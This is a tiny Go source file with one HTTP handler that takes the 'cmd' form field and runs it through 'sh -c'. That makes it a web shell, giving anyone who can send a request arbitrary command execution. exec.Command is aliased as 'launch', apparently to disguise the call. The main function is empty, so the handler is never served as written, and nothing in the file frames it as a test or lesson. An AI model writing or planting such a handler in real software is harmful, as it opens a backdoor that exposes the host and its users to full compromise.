package main
import ("net/http"; "os/exec")
func handler(w http.ResponseWriter, r *http.Request) {
  launch := exec.Command; launch("sh", "-c", r.FormValue("cmd")).Run()
}
func main() {}
